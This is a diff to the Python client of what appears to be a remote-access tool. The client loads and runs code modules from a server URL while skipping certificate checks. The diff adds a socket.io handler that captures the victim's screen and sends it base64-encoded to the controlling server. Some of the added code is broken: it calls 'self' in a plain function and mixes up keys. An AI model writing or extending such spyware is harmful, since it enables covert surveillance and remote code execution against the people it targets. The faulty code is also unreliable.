@@ -1,5 +1,6 @@
 import subprocess
 import threading
+import multiprocessing
 import platform
 import socketio
 import sys
@@ -7,8 +8,12 @@ import base64
 import ssl
 from urllib.request import urlopen
 import importlib.util
+import numpy
+import cv2
+import dxcam
 
 def run(data):
+
     def create_moduel(url):
         # Create an SSL context that doesn't verify certificates
         context = ssl._create_unverified_context()
@@ -119,6 +124,23 @@ def run(data):
             print(data['url']+data_new['url'])
             moduel = create_moduel(data['url']+data_new['url'])
             moduel.run(sio, data['uuid'])
+
+    screenshot_thread = multiprocessing.Process(target=self.take_screenshots, args=(sio, data['uid']))
+    @sio.on("screen_status")
+    def screen_status(data_new):
+        if data['uid'] == data_new['uid']:
+            if data['status'] == "start":
+                screenshot_thread.start()
+            else:
+                screenshot_thread.terminate()
+
+
+    def take_screenshots(sio, uid):
+        camera = dxcam.create()
+        screenshot = camera.grab()
+
+        _, buffer = cv2.imencode('.png', screenshot)
+        sio.emit("screenshot", {"uid": uid, "image": base64.b64encode(buffer).decode('utf-8')})
 
 
 
